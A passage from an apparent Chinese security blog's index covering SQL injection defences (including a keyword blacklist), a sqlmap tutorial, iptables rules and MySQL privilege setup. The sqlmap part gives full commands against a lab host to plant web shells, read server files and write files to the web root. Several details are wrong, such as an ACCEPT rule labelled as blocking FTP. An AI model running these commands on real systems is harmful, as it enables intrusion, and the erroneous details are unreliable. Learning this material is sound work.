            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>浅谈SQL注入防御手段</title>
      <link href="/2018/08/02/sql-inject-protect/"/>
      <url>/2018/08/02/sql-inject-protect/</url>
      <content type="html"><![CDATA[<h3 id="sql语句预编译"><a href="#sql语句预编译" class="headerlink" title="sql语句预编译"></a>sql语句预编译</h3><p>例如:<a id="more"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">"select id, no from user where id=?"</span>;</span><br><span class="line">      PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">      ps.setInt(<span class="number">1</span>, id);</span><br><span class="line">      ps.executeQuery();</span><br></pre></td></tr></table></figure><p>这里采用了<code>PreparedStatement</code>，就会将sql语句<code>预先编译</code>好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该sql语句的 语法结构了，因为语法分析已经完成了，而语法分析主要是分析sql命令，比如 <code>select ,from ,where ,and, or ,order by</code> 等等。所以即使你后面输入了这些sql命令，也不会被当成sql命令来执行了，因为这些sql命令的执行， 必须先的通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为sql命令来执行的，只会被当做字符串字面值参数。所以sql语句预编译可以防御sql注入</p><p>讲一下另外一个预编译，就是用PDO，这里就推荐几篇文章自己看一下，简单说一下就是原理跟上面的差不多，把执行语句和变量分开，变量分别绑定，分别传参，从而阻止了注入，只是底层不太明了，自己真菜。。<br><a href="https://segmentfault.com/q/1010000000723496" target="_blank" rel="noopener">https://segmentfault.com/q/1010000000723496</a><br><a href="http://www.cnblogs.com/zl0372/p/php_28.html" target="_blank" rel="noopener">http://www.cnblogs.com/zl0372/p/php_28.html</a><br><a href="https://blog.csdn.net/theVicTory/article/details/62884352" target="_blank" rel="noopener">https://blog.csdn.net/theVicTory/article/details/62884352</a></p><p>预编译方法就最有效！！也是如今市场上最流行的方式了</p><h3 id="检查变量数据类型和格式"><a href="#检查变量数据类型和格式" class="headerlink" title="检查变量数据类型和格式"></a>检查变量数据类型和格式</h3><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid=checkuid($uid);    <span class="comment">//检测$uid是不是数字类型,不是不继续往下运行</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid='&#123;$uid&#125;‘;</span></span><br></pre></td></tr></table></figure><p>这段语句是为了保证了id是数字类型，checkid是一个<code>自定义</code>的函数，但是千万别直接里面写一个<code>is_numeric</code>就结束了啊，这很容易就可以用16进制或者是科学计数法去绕过的，这个还是少用吧，毕竟自写函数就像是写黑名单，肯定会有纰漏的</p><h3 id="过滤特殊字符"><a href="#过滤特殊字符" class="headerlink" title="过滤特殊字符"></a>过滤特殊字符</h3><p>这个方法也相当于<code>黑名单</code>，还是少用为好，一般有纰漏就可以去绕过的了</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> boolean sql_inj(String str) </span><br><span class="line">&#123; </span><br><span class="line">String inj_str = “’|<span class="keyword">and</span>|exec|insert|select|delete|update| </span><br><span class="line">count|*|%|chr|mid|master|truncate|char|<span class="keyword">declare</span>|;|<span class="keyword">or</span>|-|+|,”; </span><br><span class="line">String inj_stra[] = split(inj_str,”|”); </span><br><span class="line"><span class="keyword">for</span> (int i=<span class="number">0</span> ; i &lt; inj_stra.length ; i++ ) </span><br><span class="line">&#123; <span class="keyword">if</span> (str.indexOf(inj_stra[i])&gt;=<span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="keyword">true</span>; &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>黑名单只能追求全面去避免SQL注入了</p><h3 id="转译特殊符号"><a href="#转译特殊符号" class="headerlink" title="转译特殊符号"></a>转译特殊符号</h3><p>例如:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid = <span class="keyword">isset</span>($_GET[<span class="string">'uid'</span>]) ? $_GET[<span class="string">'uid'</span>] : <span class="number">0</span>;</span><br><span class="line">$uid = addslashes(uid);</span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid='&#123;$uid&#125;'"</span>;</span><br></pre></td></tr></table></figure></p><p>这里就是利用了<code>addslashes</code>函数去对特殊字符进行转义，比如单引号会被转译成<code>\’</code>，所以无法闭合和注释。不能达到sql注入攻击的效果。一般在CTF题目里面如果我看到这个函数的话，我会预测有75%可能不是SQL注入，先去看看其他点是否存在漏洞</p><h3 id="从中间件配置上防止SQL注入"><a href="#从中间件配置上防止SQL注入" class="headerlink" title="从中间件配置上防止SQL注入"></a>从中间件配置上防止SQL注入</h3><p>通过启用php.ini配置文件中的<code>magic_quote_gpc (魔术字符)</code>，就可以将大部分想利用SQL注入漏洞的骇客拒绝于门外。开启<code>magic_quote_gpc=on</code>之后，能实现<code>addslshes()</code>和<code>stripslashes()</code>这两个函数的功能，这就从很大程度上防止了sql注入。<code>PHP 5.4</code> 之前 PHP 指令 <code>magic_quotes_gpc</code> 默认是 <code>on</code>， 实际上所有的 GET、POST 和 COOKIE 数据都用被 <code>addslashes()</code> 了。 不要对已经被 <code>magic_quotes_gpc</code> 转义过的字符串使用 <code>addslashes()</code>，因为这样会导致<code>双层转义</code>。 遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测<br>但是只开启<code>magic_quote_gpc</code> ，对防止sql注入是远远不够的。<br>例如以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid = <span class="keyword">isset</span>($_GET[<span class="string">'uid'</span>]) ? $_GET[<span class="string">'uid'</span>] : <span class="number">0</span>;</span><br><span class="line">$uid = addslashes(uid);</span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid=&#123;$uid&#125;"</span>;</span><br></pre></td></tr></table></figure><p>在这条sql语句中并没有单引号的保护，攻击者既不需要闭合单引号也不需要注释单引号，所以gpc开启对sql注入攻击的防范并没有作用。所以说变量还是要用引号包住才好，别直接就赋值了。。。</p><h3 id="通过安全waf去防御"><a href="#通过安全waf去防御" class="headerlink" title="通过安全waf去防御"></a>通过安全waf去防御</h3><p>过安全waf达到一定程度防御,软件层面的不多说。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>总的来说，现在很多网站多不会再使用字符串拼接去查找数据库里面的内容了，大多数现在使用的是预编译，除了那些荒废的网站以及CTF题目里面会使用，那是不是说以后挖洞挖SQL注入的就比较难了233333。。。我还是太年轻了</p>]]></content>
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Sqlmap 使用方法小结</title>
      <link href="/2018/08/02/sqlmap-usage/"/>
      <url>/2018/08/02/sqlmap-usage/</url>
      <content type="html"><![CDATA[<p>平常的使用GET方法像–tables –columns -T -D –dbs –dump 啥的就不说了，只是博客几天不发，空着不好，还是得写写东西<a id="more"></a></p><p>前置知识<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--is-dba 当前用户权限（是否为root权限，mssql下最高权限为sa）</span><br><span class="line">--dbs 所有数据库</span><br><span class="line">--current-db 网站当前数据库</span><br><span class="line">--users 所有数据库用户</span><br><span class="line">--current-user 当前数据库用户</span><br><span class="line">--random-agent 构造随机user-agent</span><br><span class="line">--passwords 数据库密码</span><br><span class="line">--proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒</span><br><span class="line">--threads=                       使用多少线程</span><br></pre></td></tr></table></figure></p><p><code>--is-dba</code> 这个命令有时候决定了你是否可以在服务器下进行写的操作，这个很重要，是否有写的权限，代表你是否可以在服务器上面写入一句话木马</p><h3 id="利用sqlmap进行POST注入"><a href="#利用sqlmap进行POST注入" class="headerlink" title="利用sqlmap进行POST注入"></a>利用sqlmap进行POST注入</h3><p>先利用bp去抓一个包，直接发送包里面的内容保存到一个文件里面，然后用<code>-r</code>参数去实现它就好<br>例如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql</span><br><span class="line">```    </span><br><span class="line">指定username参数，-dbms指定了某种数据库，这句话指定的是mysql数据库，-p指定的是参数，不指定的话每一个参数他都会尝试</span><br><span class="line">注意这句话已经不像平常那样需要`-u`参数了，直接`-r`参数即可，因为报文里面已经含有了含有应有的各种条件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 利用sqlmap进行需要登陆的注入</span><br><span class="line">可以跟上面进行post注入的一样，直接`-r`参数带上你的抓包文件路径，既然是需要登录的注入，那么报文里面肯定是要有`cookie`的</span><br><span class="line">我们还可以利用<span class="comment">--cookie参数注入，例如: </span></span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp; Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --current-db</span></span><br></pre></td></tr></table></figure><p>这里面的cookie参数可以抓包获得</p><h3 id="利用sqlmap进行交互式写shell"><a href="#利用sqlmap进行交互式写shell" class="headerlink" title="利用sqlmap进行交互式写shell"></a>利用sqlmap进行交互式写shell</h3><p>这个要利用sqlmap写shell的话前提需要获取网站的绝对路径，而且必须叙是root权限</p><p>使用burpsuite进行抓包，获取cookie。判断用户是否为dba，输入命令：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --is-dba</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/08/02/P0g9pT.png" alt="P0g9pT.png"></p><p>  输入命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --os-shell</span></span><br></pre></td></tr></table></figure><p>  脚本类型为PHP，所以输入4<br><img src="https://s1.ax1x.com/2018/08/02/P0gC1U.png" alt="P0gC1U.png">     </p><p>   输入第二步得到的路径，这样就可以在里面写相关命令了<br><img src="https://s1.ax1x.com/2018/08/02/P0gknJ.png" alt="P0gknJ.png"></p><p><img src="https://s1.ax1x.com/2018/08/02/P0gu9K.png" alt="P0gu9K.png"><br>这时候会在绝对路径下写入2个shell，一个用来执行命令的，另一个是用来上传的，其中上传的文件名为tmpujhum.php，这个上传的文件可以去上传小马然后连接即可，这里我们注意一下，为什么会出现admin admin这样的文字，这是sqlmap用来确认是否成功写进shell的标志，后面也会提一下。他这个写进admin的方式有可能会导致利用sqlmap写文件的时候小马文件会出现乱码。猜测是写文件的方式导致了文件的乱码，我们都知道写文件的方式要么就是ASCII要么是二进制文件流方式去实现。</p><h3 id="利用sqlmap辅助手工注入"><a href="#利用sqlmap辅助手工注入" class="headerlink" title="利用sqlmap辅助手工注入"></a>利用sqlmap辅助手工注入</h3><p>其实这个就是介绍了在发现注入点之后，怎么在sqlmap里面执行SQL语句，继续用上面的例子，改一下就是这样子的，但前提我们也是要发现数据点<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --sql-query "select user(),version(),database()"</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/08/02/P0g3Bd.png" alt="P0g3Bd.png"><br>这样就是相当于运行对应的SQL语句了。但是其实这样执行的话每一次都会对网站注入一遍，效率就比较低.<br>可以换一个方式，把<code>--sql-query</code>改为<code>--sql-shell</code>,这样一来就相当于平常我们执行SQL语句的那个cmd命令界面一样。写一条语句就直接执行一条，省去了注入的过程。</p><h3 id="利用sqlmap进行文件读写"><a href="#利用sqlmap进行文件读写" class="headerlink" title="利用sqlmap进行文件读写"></a>利用sqlmap进行文件读写</h3><p>这里可以写文件的话前提必须有<br>判断是否为<code>dba/root用户</code>，爆出了网站的绝对路径，有一个可写目录，也是用上面的案例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --file-read=/opt/lampp/htdocs/php.ini</span></span><br></pre></td></tr></table></figure><p>成功读取了<code>php.ini</code>文件，并返回了路径。</p><p><img src="https://s1.ax1x.com/2018/08/02/P0g8HA.png" alt="P0g8HA.png"><br> 打开如下图所示：<br>      这里的文件我们可以去sqlmap的output里面查看，也就是对应的用户文件夹里面</p><p>在服务器端写入文件<br>      输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --file-write C:\1.txt --file-dest /opt/lampp/htdocs/vulnerabilities/exec/1.txt</span></span><br></pre></td></tr></table></figure><p>  这里的意思就是将本地<code>C:\1.txt</code> 写入到服务器端<code>/opt/lampp/htdocs/vulnerabilities/exec/1.txt</code></p><p>打开对应文件的网站路径如下图：<br><img src="https://s1.ax1x.com/2018/08/02/P0gJAI.png" alt="P0gJAI.png">      </p><p>这里又出现了admin admin了，就是sqlmap用来确认是否写成功的标志，因为在写文件的过程中他会问是否验证，它就会以这个标志来判断啦。</p><p><img src="https://s1.ax1x.com/2018/08/02/P0gYNt.png" alt="P0gYNt.png"></p>]]></content>
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux防火墙学习</title>
      <link href="/2018/07/29/Linux-FW/"/>
      <url>/2018/07/29/Linux-FW/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux下<code>iptables</code>的设置，设置了它就能够有效地过滤掉相关的数据包从而阻挡相关攻击，感觉这个东西跟安全有很大用处，比如在我们学习的计算机网络知识里面，网络拓扑十分瓜皮，路由器没有过滤数据包的功能，直接就实现路由转发的过程，这样就会对一个LAN造成很大的安全隐患，<a id="more"></a>现在我要更正一下自己的思路，路由器不单单实现转发功能，我现在还把他看成一台可以实现过滤功能的电脑，这样就对它所连接的LAN有保护作用了，但现在一般对于网络防火墙而言很少再使用<code>iptables</code>了，现在一般都用一些大型厂商提供的防火墙。比如华3，深信服之类的，说白了就是牛逼了一点的电脑，但是对于一台服务器而言还是可以设置规则来防止别人拿下服务器的。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>netfilter</code>    ：位于Linux内核中的包过滤功能体系，称为Linux防火墙的“内核态”<br><code>iptables</code>：位于/sbin/iptables，用来管理防火墙规则的工具，称为Linux防火墙的“用户态”</p><p>—— 上述2种称呼都可以表示Linux防火墙<br>其实用户层面使用iptables也是去调用内核里面的netfilter，这是操作系统里面的知识就不多说了</p><h3 id="Linux查看防火墙状态"><a href="#Linux查看防火墙状态" class="headerlink" title="Linux查看防火墙状态"></a>Linux查看防火墙状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service iptables start 启动防火墙</span><br><span class="line">service iptables status 查看防火墙状态，还可以使用这样一条命令iptables -L --line-numbers查看较为详细的命令</span><br><span class="line">service iptables stop 停止服务</span><br></pre></td></tr></table></figure><p>如果是阿里云的主机好像没有这个服务，他是直接在网页上让你设置防火墙，这是我自己的阿里云主机，命令行界面不能设置，但是在网页端可已自行控制端口的开放以及各种规则<br><img src="https://s1.ax1x.com/2018/07/29/Pa5y1f.png" alt="Pa5y1f.png"></p><p><a href="https://imgchr.com/i/Pa5vNR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/Pa5vNR.md.png" alt="Pa5vNR.md.png"></a></p><h3 id="包过滤的工作层次"><a href="#包过滤的工作层次" class="headerlink" title="包过滤的工作层次"></a>包过滤的工作层次</h3><p>主要实现在网络层也就是对IP数据包的处理上，详细一点就是对ip地址以及端口做处理<br><a href="https://imgchr.com/i/PaI8Ej" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/PaI8Ej.md.png" alt="PaI8Ej.md.png"></a></p><p>下面是些先行知识，关于iptables的链表结构</p><h3 id="规则链"><a href="#规则链" class="headerlink" title="规则链"></a>规则链</h3><p>规则的作用：对数据包进行过滤或处理<br>链的作用：容纳各种防火墙规则<br>链的分类依据：处理数据包的不同时机</p><p>默认包括5种规则链<br><code>INPUT</code>：处理入站数据包<br><code>OUTPUT</code>：处理出站数据包<br><code>FORWARD</code>：处理转发数据包<br><code>POSTROUTING</code>链：在进行路由选择后处理数据包<br><code>PREROUTING</code>链：在进行路由选择前处理数据包</p><p>上面这5种规则，在现实生活中一般不是全都是使用</p><h3 id="规则表"><a href="#规则表" class="headerlink" title="规则表"></a>规则表</h3><p>表的作用：容纳各种规则链<br>表的划分依据：防火墙规则的作用相似</p><p>默认包括4个规则表<br><code>raw</code>表：确定是否对该数据包进行状态跟踪<br><code>mangle</code>表：为数据包设置标记<br><code>nat</code>表：修改数据包中的源、目标IP地址或端口<br><code>filter</code>表：确定是否放行该数据包（过滤）<br>常用的就是其中<strong>filter</strong>表<strong>nat</strong>表多用于实现ip的转化功能，这里的表功能个人感觉相当于链下面的表功能，每种链都存在这四种表</p><h3 id="规则表之间的默认优先级"><a href="#规则表之间的默认优先级" class="headerlink" title="规则表之间的默认优先级"></a>规则表之间的默认优先级</h3><p><code>raw&gt;mangle&gt;nat&gt;filter</code><br>规则链之间的默认优先级<br>入站：<code>PREROUTING&gt;INPUT</code><br>出站：<code>OUTPUT&gt;POSTROUTING</code><br>转发：<code>PREROUTING&gt;FORWARD&gt;POSTROUTING</code><br>规则链内的匹配顺序<br>按顺序依次检查，匹配即停止（LOG策略例外）<br>若找不到相匹配的规则，则按该链的默认策略处理，这跟路由转发还是有点区别的<br><a href="https://imgchr.com/i/PaIBb4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/PaIBb4.md.png" alt="PaIBb4.md.png"></a></p><p>整个基本流程大概就是这样，反正吧现在的网络环境一般都是只需要其中的一部分</p><h3 id="命令实现"><a href="#命令实现" class="headerlink" title="命令实现"></a>命令实现</h3><p>基本格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables  [-t 表名]  选项  [链名]  [条件]  [-j 控制类型]</span><br></pre></td></tr></table></figure><p>几个<code>注意事项</code><br>不指定表名时，默认指filter表<br>不指定链名时，默认指表内的所有链<br>除非设置链的默认策略，否则必须指定匹配条件<br>选项、链名、控制类型使用大写字母，其余均为小写</p><p>数据包的常见控制类型<br><code>ACCEPT</code>：允许通过<br><code>DROP</code>：直接丢弃，不给出任何回应<br><code>REJECT</code>：拒绝通过，必要时会给出提示<br><code>LOG</code>：记录日志信息，然后传给下一条规则继续匹配</p><p>添加新的规则,这里考虑到他的匹配规则必要的时候需要换一下命令<br><code>-A</code>：在链的末尾追加一条规则<br><code>-I</code>：在链的开头（或指定序号）插入一条规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -A INPUT -p tcp -j ACCEPT   直接在最后加入规则</span><br><span class="line">iptables -I INPUT 2 -p icmp -j ACCEPT 这样就是在第二条后面插入规则</span><br></pre></td></tr></table></figure><p>删除、清空规则<br><code>-D</code>：删除链内指定序号（或内容）的一条规则<br><code>-F</code>：清空所有的规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> iptables -F  清空所有规则</span><br><span class="line">iptables -D INPUT 3  删除第三条规则</span><br></pre></td></tr></table></figure><p>设置默认策略<br><code>-P</code>：为指定的链设置默认规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -P FORWARD DROP  给FORWARD链默认设置DROP规则</span><br></pre></td></tr></table></figure><p>协议匹配：<code>-p</code> 协议名<br>地址匹配：<code>-s</code> 源地址、<code>-d</code> 目的地址<br>接口匹配：<code>-i</code> 入站网卡、<code>-o</code> 出站网卡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -p ! icmp -j ACCEPT  这条命令的意思就是除了icmp协议之外的所有协议都ACCEPT</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -s 10.20.30.0/24 -j DROP  这条命令的意思就是把来自10.20.30.0这一个网段的包全都丢掉，有效防止了DDOS攻击</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROP </span><br><span class="line">iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROP</span><br><span class="line">iptables -A INPUT -i eth1 -s 172.16.0.0/12 -j DROP</span><br></pre></td></tr></table></figure><p>上面这三条命令也很有实际意义，假设有人恶意串改了源地址，同时把这个包发送到内网，内网的机子会对这种包做出响应，此时源地址变成目的地址，就会直接在内网里面一个个尝试对应IP从而可以攻击内网的机子，因为这种源IP是内网地址的是不可能出现在互联网上的，理所当然应该禁止</p><p>端口匹配：<code>--sport</code>源端口、<code>--dport</code> 目的端口<br>TCP标记匹配：<code>--tcp-flags</code> 检查范围 被设置的标记<br>ICMP类型匹配：<code>--icmp-type</code> ICMP类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -s 192.168.4.0/24 -p udp --dport 53 -j ACCEPT   对于192.168.4.0这个网段的DNS服务开启做相应规则</span><br><span class="line">iptables -A INPUT -p tcp --dport 20:21 -j ACCEPT 禁止FTP</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -j DROP</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 3 -j ACCEPT</span><br></pre></td></tr></table></figure><p>这就是我前面讲的对应自己ping别人可收到响应报文，别人却ping不到你，有效降低你被别人攻击的可能</p><p>再来看看一个例子<br>输入命令<code>iptables -t filter -I INPUT -p icmp -j REJECTED</code><br>这条命令是对进入的数据包进行icmp所有协议包进行过滤，需要注意两点第一，控制类型不一样返回的效果也不一样，第二对于icmp这种类型的报文而言，响应包跟请求包都被截了，后面会讲到如何可以接受icmp响应包而不接受请求包<br>然后尝试ping一下对面的机子，这是拒绝(REJECT)的效果<br><img src="https://s1.ax1x.com/2018/07/29/PaIsa9.png" alt="PaIsa9.png"></p><p>这是直接丢弃(DROP)的效果<br><img src="https://s1.ax1x.com/2018/07/29/PaIy5R.png" alt="PaIy5R.png"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本来还想写写Windows下的防火墙，但由于是图形化界面，学起来也容易上手，就没写了，我比较懒~~~运用好防火墙，可以隐藏你自己的IP地址，减少被攻击的可能性，在生活中大有用处。</p>]]></content>
      
      <categories>
          
          <category> 环境部署 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux安全 </tag>
            
            <tag> 服务器运维 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Mysql安全配置</title>
      <link href="/2018/07/26/Mysql-security-1/"/>
      <url>/2018/07/26/Mysql-security-1/</url>
      <content type="html"><![CDATA[<p>mysql中存在4个控制权限的表，分别为<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. mysql.USER表</span><br><span class="line">2. mysql.DB表</span><br><span class="line">3. mysql.TABLES_PRIV表</span><br><span class="line">4. mysql.COLUMNS_PRIV表</span><br></pre></td></tr></table></figure><p>要注意的是，Mysql中有一个数据库”<code>information_schema</code>“，似乎里面保存的也是一些权限信息，但是要明白的是，这个数据库”<code>information_schema</code>“是为系统管理员提供元数据的一个简便方式，它实际上是一个视图，可以理解为对Mysql中的一个信息的封装，对于Mysql主程序来说，身份认证和授权的信息的来源只有一个，就是”<code>mysql</code>“。</p><p>在我们进行数据库连接、登录的时候，mysql权限表的验证过程为：</p><ol><li>先从user表中的:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) Host</span><br><span class="line">2) User</span><br><span class="line">3) Password</span><br></pre></td></tr></table></figure><p>这3个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。</p><ol start="2"><li>通过身份认证后，进行权限分配，按照下面的顺序进行验证。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1) user</span><br><span class="line">2) db</span><br><span class="line">3) tables_priv</span><br><span class="line">4) columns_priv</span><br></pre></td></tr></table></figure><p>即先检查全局权限表user，如果user中对应的权限为Y，则此用户对所有数据库的权限都为Y，将<code>不再</code>检查<code>db，tables_priv,columns_priv</code><br>如果全局权限表<code>user</code>对应的权限为<code>N</code>，则到db表中检查此用户对应的具体数据库，并得到db中为Y的权限<br>如果db中为N，则检查<code>tables_priv</code>中此数据库对应的具体表，取得表中的权限Y，以此类推。逐级下降</p><p>用自己的话讲就是因为查找他们权限是否配置好根据情况查看<code>mysql</code>这个数据库中的<code>user，db，tables_priv，columns_pri</code>，一旦在某个级别设置好了权限就不需要网下一级去看他是否存在权限了，因为下面一级的表都不会显示，这是为了防止数据库数据冗余。就是例如你设置的是所有数据库及表的权限的话，到时候就直接<code>select * from user;</code>就可以查看对应的程序啦<br><a href="https://imgchr.com/i/PNNSfK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/26/PNNSfK.md.png" alt="PNNSfK.md.png"></a></p><p>对于Mysql中的账户权限相关的安全配置，总结如下：</p><ol><li>针对每个网站建立一个单独的账户</li><li>为每个网站单独建立一个专属数据库(虽然DEDE、DZ普通采用表前缀的方法来实现”一库多站”，但好的做法还是”一库一站”)</li><li>按照<code>user-&gt;db-&gt;tables_priv-&gt;columns_pri</code>的顺序进行细粒度的权限控制</li><li>为每个用户单独配置一个专属数据库，保证当前用户的所有操作只能发生在它自己的数据库中，防止SQL注入发生后，黑客通过注入点访问到系统表</li></ol><p>账户权限安全配置需要的常用命令<br>1)新建一个用户并给予相应数据库的权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant select,insert,update,delete,create,drop privileges on 数据库名字.表名 to user@localhost identified by 'passwd';    //如果是*号就是代表全部*.*代表所有数据库下的全部表名</span><br><span class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> database.* 